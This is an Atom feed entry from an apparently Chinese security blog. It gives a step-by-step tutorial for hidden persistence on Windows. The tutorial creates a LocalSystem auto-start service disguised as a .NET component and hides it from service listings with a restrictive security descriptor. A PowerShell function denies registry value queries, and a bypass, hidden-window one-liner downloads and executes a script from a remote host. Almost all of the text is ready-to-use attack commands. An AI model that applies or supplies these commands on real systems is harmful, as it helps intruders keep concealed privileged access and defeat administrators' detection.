<?xml version="1.0"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://zlte.netlify.app</id>
    <title>竹林寺 • Posts by &#34;权限维持&#34; tag</title>
    <link href="https://zlte.netlify.app" />
    <updated>2024-01-21T16:30:34.000Z</updated>
    <category term="域控提权" />
    <category term="权限维持" />
    <entry>
        <id>https://zlte.netlify.app/2024/01/22/comm/%E5%AE%89%E5%85%A8%E6%8F%8F%E8%BF%B0%E7%AC%A6%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/</id>
        <title>win权限维持/安全描述符权限维持</title>
        <link rel="alternate" href="https://zlte.netlify.app/2024/01/22/comm/%E5%AE%89%E5%85%A8%E6%8F%8F%E8%BF%B0%E7%AC%A6%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/"/>
        <content type="html">&lt;p&gt;&lt;strong&gt;竹林寺&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;cmd powershell 选其一&lt;/strong&gt;&lt;/p&gt;
&lt;h2 id=&#34;1cmd创建自启动服务&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#1cmd创建自启动服务&#34;&gt;#&lt;/a&gt; 1.cmd 创建自启动服务&lt;/h2&gt;
&lt;figure class=&#34;highlight bash&#34;&gt;&lt;figcaption data-lang=&#34;bash&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;sc create &lt;span class=&#34;token string&#34;&gt;&#34;.NET CLR Networking 3.5.0.0&#34;&lt;/span&gt; &lt;span class=&#34;token assign-left variable&#34;&gt;binpath&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;cmd.exe /k C:&lt;span class=&#34;token entity&#34; title=&#34;\t&#34;&gt;\t&lt;/span&gt;est.txt&#34;&lt;/span&gt; &lt;span class=&#34;token assign-left variable&#34;&gt;depend&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; Tcpip &lt;span class=&#34;token assign-left variable&#34;&gt;obj&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; Localsystem &lt;span class=&#34;token assign-left variable&#34;&gt;start&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; auto&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;h2 id=&#34;2-powershell创建自启动服务&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#2-powershell创建自启动服务&#34;&gt;#&lt;/a&gt; 2. powershell 创建自启动服务&lt;/h2&gt;
&lt;figure class=&#34;highlight powershell&#34;&gt;&lt;figcaption data-lang=&#34;PowerShell&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token function&#34;&gt;new-service&lt;/span&gt; –Name &lt;span class=&#34;token string&#34;&gt;&#34;.NET CLR Networking 3.5.0.0&#34;&lt;/span&gt; –DisplayName &lt;span class=&#34;token string&#34;&gt;&#34;.NET CLR Networking 3.5.0.0&#34;&lt;/span&gt; –BinaryPathName &lt;span class=&#34;token string&#34;&gt;&#34;cmd.exe /k C:\test.txt&#34;&lt;/span&gt; – StartupType AutomaticDelayedStart  &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt; &lt;span class=&#34;token function&#34;&gt;new-service&lt;/span&gt; –Name &lt;span class=&#34;token string&#34;&gt;&#34;.NET CLR Networking 3.5.0.0&#34;&lt;/span&gt; –DisplayName &lt;span class=&#34;token string&#34;&gt;&#34;.NET CLR Networking 3.5.0.0&#34;&lt;/span&gt; –BinaryPathName &lt;span class=&#34;token string&#34;&gt;&#34;cmd.exe /k C:\test.txt&#34;&lt;/span&gt; –StartupType AutomaticDelayedStart&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;h2 id=&#34;3-通过修改sddl安全描述符隐藏服务&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#3-通过修改sddl安全描述符隐藏服务&#34;&gt;#&lt;/a&gt; 3. 通过修改 SDDL (安全描述符) 隐藏服务&lt;/h2&gt;
&lt;figure class=&#34;highlight bash&#34;&gt;&lt;figcaption data-lang=&#34;bash&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;sc sdset &lt;span class=&#34;token string&#34;&gt;&#34;.NET CLR Networking 3.5.0.0&#34;&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;D:(D;;DCLCWPDTSD;;;IU) (D;;DCLCWPDTSD;;;SU)(D;;DCLCWPDTSD;;;BA)(A;;CCLCSWLOCRRC;;;IU) (A;;CCLCSWLOCRRC;;;SU)(A;;CCLCSWRPWPDTLOCRRC;;;SY) (A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)S:(AU;FA;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;WD)&#34;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;h2 id=&#34;4-然后通过sc与get-server查找服务均无结果&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#4-然后通过sc与get-server查找服务均无结果&#34;&gt;#&lt;/a&gt; 4. 然后通过 sc 与 get-server 查找服务均无结果：&lt;/h2&gt;
&lt;figure class=&#34;highlight bash&#34;&gt;&lt;figcaption data-lang=&#34;bash&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;sc query &lt;span class=&#34;token operator&#34;&gt;|&lt;/span&gt;findstr &lt;span class=&#34;token string&#34;&gt;&#34;.NET CLR Networking 3.5.0.0&#34;&lt;/span&gt; &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;get-service &lt;span class=&#34;token operator&#34;&gt;|&lt;/span&gt; findstr &lt;span class=&#34;token string&#34;&gt;&#34;.NET CLR Networking 3.5.0.0&#34;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;&lt;img data-src=&#34;https://zlte.netlify.app/imgs/win%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81_1.png&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;5-但这样做有一个问题在注册表中很容易看到异常value&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#5-但这样做有一个问题在注册表中很容易看到异常value&#34;&gt;#&lt;/a&gt; 5. 但这样做有一个问题：在注册表中很容易看到异常 value。&lt;/h2&gt;
&lt;p&gt;&lt;img data-src=&#34;https://zlte.netlify.app/imgs/win%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81_2.png&#34; alt=&#34;image.png&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;6-修改注册表acl&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#6-修改注册表acl&#34;&gt;#&lt;/a&gt; 6. 修改注册表 ACL&lt;/h2&gt;
&lt;p&gt;&lt;strong&gt;我们可以通过修改注册表的 DACL 来拒绝对值的查询，达到隐藏异常值的效果。&lt;/strong&gt;&lt;br /&gt;
** 这里给出一个通过 powershell 修改注册表项的访问权限的简单脚本：   **&lt;/p&gt;
&lt;figure class=&#34;highlight powershell&#34;&gt;&lt;figcaption data-lang=&#34;PowerShell&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;function&lt;/span&gt; Server-Sddl-Change&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token namespace&#34;&gt;[CmdletBinding()]&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;param&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token namespace&#34;&gt;[parameter(Mandatory=$false)]&lt;/span&gt;&lt;span class=&#34;token namespace&#34;&gt;[String]&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$Name&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token variable&#34;&gt;$ROOT&lt;/span&gt; = &lt;span class=&#34;token string&#34;&gt;&#34;HKLM:\SYSTEM\CurrentControlSet\Services\&#34;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;8&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token variable&#34;&gt;$S&lt;/span&gt; = &lt;span class=&#34;token variable&#34;&gt;$ROOT&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$NAME&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;9&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token variable&#34;&gt;$acl&lt;/span&gt; = &lt;span class=&#34;token function&#34;&gt;Get-Acl&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$S&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;10&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token variable&#34;&gt;$acl&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;SetAccessRuleProtection&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token boolean&#34;&gt;$true&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token boolean&#34;&gt;$false&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;11&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token variable&#34;&gt;$person&lt;/span&gt; = &lt;span class=&#34;token namespace&#34;&gt;[System.Security.Principal.NTAccount]&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;Everyone&#34;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;12&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token variable&#34;&gt;$access&lt;/span&gt; = &lt;span class=&#34;token namespace&#34;&gt;[System.Security.AccessControl.RegistryRights]&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;QueryValues&#34;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;13&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token variable&#34;&gt;$inheritance&lt;/span&gt; = &lt;span class=&#34;token namespace&#34;&gt;[System.Security.AccessControl.InheritanceFlags]&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;None&#34;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;14&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token variable&#34;&gt;$propagation&lt;/span&gt; = &lt;span class=&#34;token namespace&#34;&gt;[System.Security.AccessControl.PropagationFlags]&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;None&#34;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;15&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token variable&#34;&gt;$type&lt;/span&gt; = &lt;span class=&#34;token namespace&#34;&gt;[System.Security.AccessControl.AccessControlType]&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;Deny&#34;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;16&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token variable&#34;&gt;$rule&lt;/span&gt; = &lt;span class=&#34;token function&#34;&gt;New-Object&lt;/span&gt; System&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;Security&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;AccessControl&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;RegistryAccessRule&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt; `&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;17&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token variable&#34;&gt;$person&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$access&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$inheritance&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$propagation&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$type&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;18&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token variable&#34;&gt;$acl&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;AddAccessRule&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$rule&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;19&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token variable&#34;&gt;$person&lt;/span&gt; = &lt;span class=&#34;token namespace&#34;&gt;[System.Security.Principal.NTAccount]&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;Everyone&#34;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;20&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token variable&#34;&gt;$access&lt;/span&gt; =&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;21&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token namespace&#34;&gt;[System.Security.AccessControl.RegistryRights]&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;SetValue,CreateSubKey,EnumerateSu&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;22&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;bKeys,Notify,CreateLink,Delete,ReadPermissions,WriteKey,ExecuteKey,ReadKey,Chang&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;23&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;ePermissions,TakeOwnership&#34;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;24&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token variable&#34;&gt;$inheritance&lt;/span&gt; = &lt;span class=&#34;token namespace&#34;&gt;[System.Security.AccessControl.InheritanceFlags]&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;None&#34;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;25&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token variable&#34;&gt;$propagation&lt;/span&gt; = &lt;span class=&#34;token namespace&#34;&gt;[System.Security.AccessControl.PropagationFlags]&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;None&#34;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;26&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token variable&#34;&gt;$type&lt;/span&gt; = &lt;span class=&#34;token namespace&#34;&gt;[System.Security.AccessControl.AccessControlType]&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;Allow&#34;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;27&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token variable&#34;&gt;$rule&lt;/span&gt; = &lt;span class=&#34;token function&#34;&gt;New-Object&lt;/span&gt; System&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;Security&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;AccessControl&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;RegistryAccessRule&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt; `&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;28&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token variable&#34;&gt;$person&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$access&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$inheritance&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$propagation&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$type&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;29&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token variable&#34;&gt;$acl&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;AddAccessRule&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$rule&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;30&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token function&#34;&gt;Set-Acl&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$S&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$acl&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;31&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;h2 id=&#34;7-远程加载powershell脚本&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#7-远程加载powershell脚本&#34;&gt;#&lt;/a&gt; 7. 远程加载 powershell 脚本：&lt;/h2&gt;
&lt;figure class=&#34;highlight powershell&#34;&gt;&lt;figcaption data-lang=&#34;PowerShell&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;powershell&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;exe &lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;exec bypass &lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;nop &lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;w hidden &lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;c &#34;&lt;span class=&#34;token function&#34;&gt;IEX&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;new-object&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;net&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;webclient&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;downloadstring&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;http://192.168.0.149/1.ps1&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;Server-Sddl-Change &lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;Name &lt;span class=&#34;token string&#34;&gt;&#39;.NET CLR Networking 3.5.0.0&#39;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;h2 id=&#34;8-net-clr-networking-3500-改成你的服务名-从下图可见已将值从该服务项中隐藏&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#8-net-clr-networking-3500-改成你的服务名-从下图可见已将值从该服务项中隐藏&#34;&gt;#&lt;/a&gt; 8. .NET CLR Networking 3.5.0.0 改成你的服务名 从下图可见已将值从该服务项中隐藏：&lt;/h2&gt;
&lt;p&gt;&lt;img data-src=&#34;https://zlte.netlify.app/imgs/win%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81_3.png&#34; alt=&#34;image.png&#34; /&gt;&lt;/p&gt;
</content>
        <category term="权限维持" />
        <updated>2024-01-21T16:30:34.000Z</updated>
    </entry>
</feed>
